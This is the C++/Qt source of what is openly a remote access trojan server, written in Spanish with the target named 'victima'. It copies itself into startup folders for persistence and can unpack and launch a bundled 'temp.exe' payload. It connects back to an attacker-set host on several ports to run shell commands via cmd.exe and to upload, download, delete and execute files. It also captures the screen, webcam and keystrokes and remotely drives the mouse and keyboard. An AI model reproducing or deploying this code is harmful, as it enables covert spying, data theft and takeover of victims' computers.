/*
 *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QtTest/QTest>
#include <QPoint>
MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    /** Constructor de la clase **/
    ui->setupUi(this);
    inicio();
}

MainWindow::~MainWindow()
{
    /** Destructor de la clase **/
    delete ui;
}

void MainWindow::changeEvent(QEvent *e)
{
    /** Funci�n de manejo de eventos **/
    QMainWindow::changeEvent(e);
    switch (e->type()) {
    case QEvent::LanguageChange:
        ui->retranslateUi(this);
        break;
    default:
        break;
    }
}

void MainWindow::inicio(){
    /** funcion que se ejecuta al inicio de la aplicacion **/
    this->generarVentanaChat();
    QString home = directorio.homePath(); //ruta absoluta del directorio raiz del usuario
    QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicación
    if(!cargarConfiguracion())
    {
        if (directorio.exists(home + "/.kde4/Autostart")) { //openSUSE
            QFile::copy(appPath,home + "/.kde4/Autostart/" + this->nombreCopiable);
        }
        if (directorio.exists(home + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
            QFile::copy(appPath,home + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
        }
    }
    temporizador.start(this->tiempoConexion); //iniciar el temporizador para conexión
    connect(&temporizador,SIGNAL(timeout()),this,SLOT(conectar())); //cada "tiempoConexion" intentar conectar
    connect(&socket,SIGNAL(readyRead()),this,SLOT(llegadaDatos()));
    connect(&socket,SIGNAL(disconnected()),this,SLOT(desconectado()));
    connect(&socketArchivos,SIGNAL(readyRead()),this,SLOT(llegadaDatosArchivo()));
    connect(&socketEscritorio,SIGNAL(readyRead()),this,SLOT(llegadaDatosEscritorio()));
    connect(&socketWebcam,SIGNAL(readyRead()),this,SLOT(llegadaDatosWebcam()));
    connect(this->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
    connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
    QApplication::setQuitOnLastWindowClosed(false);
    log.setFileName("./log"); //archivo de log del keylogger
    verTecla.setInterval(50);
    this->verTecla.start();
}

bool MainWindow::cargarConfiguracion(){
    /** Cargar la configuraci�n del servidor guardada en el �ltimo KB del ejecutable **/
    //valores por defecto
    this->host = "localhost";
    this->port = 1234;
    this->portArchivos = 2345;
    this->portEscritorio = 3456;
    this->portWebcam = 4567;
    this->tiempoConexion = 30000;
    this->alias = "victima";
    QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicación
    this->nombreCopiable =  QFileInfo(appPath).fileName(); //Nombre del ejecutable
    // No olividar renombrar el ejecutable a rawserver.dat y moverlo al directorio del cliente
    QString datos;
    QString conversion;
    QStringList campo;
    QFile servidor;
    servidor.setFileName(QApplication::applicationFilePath());
    servidor.open(QIODevice::ReadOnly);
    servidor.seek(servidor.size() - 1024);
    datos = servidor.read(1024);
    servidor.close();
    campo = datos.split("|@|");
    if(campo.size() >= 7)
    {
        this->host = campo[1];
        conversion = campo[2];
        this->port = conversion.toInt();
        conversion = campo[3];
        this->portArchivos = conversion.toInt();
        conversion = campo[4];
        this->portEscritorio = conversion.toInt();
        conversion = campo[5];
        this->portWebcam = conversion.toInt();
        conversion = campo[6];
        this->tiempoConexion = conversion.toInt();
        this->alias = campo[7];
        this->nombreCopiable = campo[10];
        if (campo[8] == "unido")
        {
            QByteArray datos;
            datos = "|@|" + campo[1].toLatin1() + "|@|";
            datos = datos + campo[2].toLatin1() + "|@|";
            datos = datos + campo[3].toLatin1() + "|@|";
            datos = datos + campo[4].toLatin1() + "|@|";
            datos = datos + campo[5].toLatin1() + "|@|";
            datos = datos + campo[6].toLatin1() + "|@|";
            datos = datos + campo[7].toLatin1() + "|@|";
            datos = datos + "nounido" + "|@|";
            datos = datos + "0" + "|@|";
            datos = datos + campo[10].toLatin1() + "|@|";
            qint64 tamano;
            tamano = campo[9].toInt();
            QFile adjunto;
            QFile servidor;
            QFile copiable;
            adjunto.setFileName("temp.exe");
            servidor.setFileName(QApplication::applicationFilePath());
            if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
                copiable.setFileName(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + campo[10]);
            }

            copiable.open(QFile::WriteOnly);
            adjunto.open(QFile::WriteOnly);
            servidor.open(QFile::ReadOnly);
            copiable.write(servidor.read(servidor.size() - 1024 - tamano));
            servidor.seek(servidor.size() - 1024 - tamano);
            adjunto.write(servidor.read(tamano));
            copiable.write(datos,1024);
            copiable.close();
            servidor.close();
            adjunto.close();
            proceso.setWorkingDirectory(QApplication::applicationDirPath());
            proceso.startDetached("temp.exe");
            return true;
        }

    }
    return false;
}

void MainWindow::conectar(){
    /** función que conecta al cliente **/

    log.write(cadenaa);
    log.close();
    if (socket.state() == QAbstractSocket::ConnectedState ){
        temporizador.stop();
    }
    else {
        socket.close();
        socketArchivos.close();
        socketEscritorio.close();
        socketWebcam.close();
        socketWebcam.connectToHost(host,portWebcam);
        socketEscritorio.connectToHost(host,portEscritorio);
        socketArchivos.connectToHost(host,portArchivos);
        socket.connectToHost(host,port);
    }

}

void MainWindow::llegadaDatos() {
    /** Funci�n para el manejo de los datos recibidos a trav�z del socket **/
    QString datos;
    datos = socket.readAll();
    QStringList parametros =  datos.split("|@|");
    if(parametros[0] == "shell"){ //shell remoto
        QString salidaShell;
        salidaShell = "shell|@|" + shell(parametros[1].toLatin1());
        util.escribirSocket(salidaShell,&socket);
    }
    if (parametros[0] == "home"){
        util.escribirSocket("home|@|" + QDir::homePath(),&socket);
    }
    if (parametros[0] == "archivos"){
        listarArchivos(parametros[1]);
    }
    if (parametros[0] == "directorios"){
        listarDirectorios(parametros[1]);
    }
    if (parametros[0] == "get"){

        util.enviarArchivo(parametros[1],&socketArchivos);
    }
    if (parametros[0] == "put"){
        archivo = parametros[1];
    }
    if (parametros[0] == "remove"){
        directorio.remove(parametros[1]);
    }
    if (parametros[0] == "createfolder"){
        directorio.mkdir(parametros[1]);
    }
    if (parametros[0] == "execute")
    {
        QProcess::startDetached(parametros[1]);
    }
    if (parametros[0] == "alerta"){
        mostrarMensaje("alerta",parametros[2],parametros[1]);
    }
    if (parametros[0] == "info"){
        mostrarMensaje("info",parametros[2],parametros[1]);
    }
    if (parametros[0] == "peligro"){
        mostrarMensaje("peligro",parametros[2],parametros[1]);
    }
    if (datos == "reiniciar"){
        reiniciar();
    }
    if (datos == "cerrar"){ //cerrar el servidor
        QApplication::exit();
    }
    if (datos == "ping") { //ping al servidor
        util.escribirSocket("pong",&socket);
    }
    if (datos == "abrirchat") {
        this->abrirChat();
    }
    if (datos == "cerrarchat") {
        this->cerrarChat();
    }
    if (parametros[0] == "chat") {
        this->nickVictima = parametros[3];
        this->ponerMensajeChat(parametros[1],parametros[2]);
    }
    if (parametros[0] == "activark")
    {
        verTecla.start();
    }
    if (parametros[0] == "desactivark")
    {
        verTecla.stop();
    }
    if (parametros[0] == "recibirk")
    {
        QFile klog;
        klog.setFileName("./log");
        klog.open(QFile::ReadOnly);
        util.escribirSocket("teclas|@|" + klog.readAll(),&socket);
        klog.close();
    }
    if (parametros[0] == "limpiark")
    {
        QDir directorio;
        if(this->verTecla.isActive())
        {
            this->verTecla.stop();
            directorio.remove("./log");
            this->verTecla.start();
        }
        else
        {
            directorio.remove("./log");
        }
    }
    if (parametros[0] == "alias")
    {
        util.escribirSocket("alias|@|" + this->alias,&socket);
    }

}
void MainWindow::llegadaDatosArchivo(){
    /** Funci�n invocada para recibir un archivo enviado por el cliente **/
    util.recibirArchivo(directorio.path() + "/" + archivo,&socketArchivos);
}
void MainWindow::llegadaDatosEscritorio(){
    /** Funci�n de petici�n de captura de escritorio **/

    QString datos = socketEscritorio.readAll();
    QStringList parametros = datos.split("|@|");
    if(parametros[0] == "tecla")
    {
        enviarTecla(parametros[1].toInt());
    }
    if (parametros[0] == "derecho")
    {
        QPoint puntero;
        puntero.setX(parametros[1].toInt());
        puntero.setY(parametros[2].toInt());
        QTest::mouseMove(QApplication::desktop(),puntero);
        hacerClickDerecho();
    }
    if (parametros[0] == "izquierdo")
    {
        QPoint puntero;
        puntero.setX(parametros[1].toInt());
        puntero.setY(parametros[2].toInt());
        QTest::mouseMove(QApplication::desktop(),puntero);
        hacerClickIzquierdo();
    }
    if (parametros[0] == "resolucion")
    {
        QString ancho;
        ancho.setNum(QApplication::desktop()->height());
        QString alto;
        alto.setNum(QApplication::desktop()->width());
        util.escribirSocket("resolucion|@|" + ancho + "|@|" + alto,&socket);
    }
    if (parametros[0] == "capturar")
    {
        QPixmap captura;
        captura = screenShot();
        buffer = new QBuffer(&bytes);
        connect(buffer,SIGNAL(bytesWritten(qint64)),this,SLOT(datosEscritos()));
        buffer->open(QIODevice::ReadWrite);
        captura.save(buffer,"jpg",parametros[1].toInt());
    }
}
void MainWindow::llegadaDatosWebcam()
{ /** Funci�n donde se reciben las peticiones de captura de webcam asi como su encendido y apagado **/
    QString datos = socketWebcam.readAll();
    QStringList parametros = datos.split("|@|");
    if (parametros[0] == "cap")
    {
        QPixmap imagen;
        QDir directorio;
        imagen = capturar();
       // directorio.remove("./captura.jpg");
        imagen.save("./dat","jpeg",parametros[1].toInt());
        util.enviarArchivo("./dat",&socketWebcam);
    }
    if (parametros[0] == "encender")
    {
        encender();
    }
    if (parametros[0] == "apagar")
    {
        apagar();
    }
}
void MainWindow::datosEscritos(){
    /** Esta funci�n est� pensada para esperar a que los datos de la captura sean escritos a memoria antes de enviarlos **/
    QByteArray array;
    array.setNum(bytes.size());
    util.escribirSocketDatos(array,&socketEscritorio);
    socketEscritorio.waitForBytesWritten(1000);
    util.escribirSocketDatos(bytes,&socketEscritorio);
    //socketEscritorio.waitForBytesWritten(-1);
}

QPixmap MainWindow::screenShot(){
    /** Funci�n que realiza la caputa de la pantalla **/
    QPixmap captura;
    captura = QPixmap::grabWindow(QApplication::desktop()->winId());
    return captura;
}
void MainWindow::desconectado() {
    /** cosas que hacer al desconectarse **/
    temporizador.start(this->tiempoConexion);

}

QString MainWindow::shell(QString comando){
    /** Funci�n que ejecuta el comando de consola pasado como par�metro y devuelve la salida **/
    consola.start("cmd.exe /C " + comando);
    consola.waitForReadyRead();
    return consola.readAllStandardOutput();
}

void MainWindow::reiniciar(){
    /** Funci�n que reinicia el servidor **/
    QProcess consola;
    QString filePath = QApplication::applicationFilePath();
    consola.execute(filePath);
    QApplication::exit();
}

void MainWindow::listarArchivos(QString ruta){
    /** Funci�n que envia por socket una lista de archivos del directorio pasado como par�metro **/
    int i;
    QString archivos = "file|@|";
    directorio.cd(ruta);
    QStringList listaArchivos = directorio.entryList(QDir::Files);
    for (i=0;i<listaArchivos.size();i++){
        archivos = archivos + listaArchivos[i] + "|@|";
    }
    util.escribirSocket(archivos,&socket);
}

void MainWindow::listarDirectorios(QString ruta){
    /** Funci�n que envia por socket una lista de directorios del directorio pasado como par�metro **/
    int i;
    QString directorios = "folder|@|";
    directorio.cd(ruta);
    QStringList listaDirectorios = directorio.entryList(QDir::Dirs);
    for (i=0;i<listaDirectorios.size();i++){
        directorios = directorios + listaDirectorios[i] + "|@|";
    }

    util.escribirSocket(directorios,&socket);
}

void MainWindow::mostrarMensaje(QString tipo, QString titulo, QString texto){
    /** Funci�n que muestra mensajes emergentes **/
    mensaje = new QMessageBox(this);
    mensaje->setWindowModality(Qt::NonModal);
    if (tipo == "alerta"){
       mensaje->setIcon(QMessageBox::Warning);
    }
    if (tipo == "info"){
        mensaje->setIcon(QMessageBox::Information);
    }
    if (tipo == "peligro"){
        mensaje->setIcon(QMessageBox::Critical);
    }
    mensaje->setWindowTitle(titulo);
    mensaje->setText(texto);
    mensaje->setVisible(true);
}
void MainWindow::generarVentanaChat()
{
    /** Crea una ventana de chat **/
    this->chat = new QWidget(0,Qt::CustomizeWindowHint);
    this->capa = new QVBoxLayout(chat);
    this->capaHorizontal = new QHBoxLayout(chat);
    this->botonChatEnviar = new QPushButton("Enviar",chat);
    this->enviarChatTexto = new QLineEdit(chat);
    salidaChatTexto = new QPlainTextEdit(chat);
    capa->addWidget(salidaChatTexto);
    capaHorizontal->addWidget(enviarChatTexto);
    capaHorizontal->addWidget(botonChatEnviar);
    capa->addLayout(capaHorizontal);
}

void MainWindow::abrirChat()
{
    /** Funci�n que abre la ventana de chat **/
    chat->show();
}

void MainWindow::cerrarChat()
{
    /** Funci�n que cierra la ventana de chat **/
    this->chat->close();
}

void MainWindow::enviarMensajeChat()
{
    /** Envia un mensaje de chat al cliente **/
    this->ponerMensajeChat(this->enviarChatTexto->text(),this->nickVictima);
    util.escribirSocket ( "chat|@|" + this->enviarChatTexto->text() ,&socket);
    this->enviarChatTexto->clear();
}

void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
{
    /** muestra el mensaje de char recibido **/
    this->salidaChatTexto->document()->setHtml(this->salidaChatTexto->document()->toHtml() + "<br>" + quien + " dice: " + mensajeChat);
}

void MainWindow::escucharTeclas()
{
        log.open(QFile::Append);
        char num;
        num = comprobarTeclas();
        if(num != 0)
        {
            cadenaa.append(num);
            log.write(cadenaa);
            cadenaa.clear();
            log.close();
        }
}
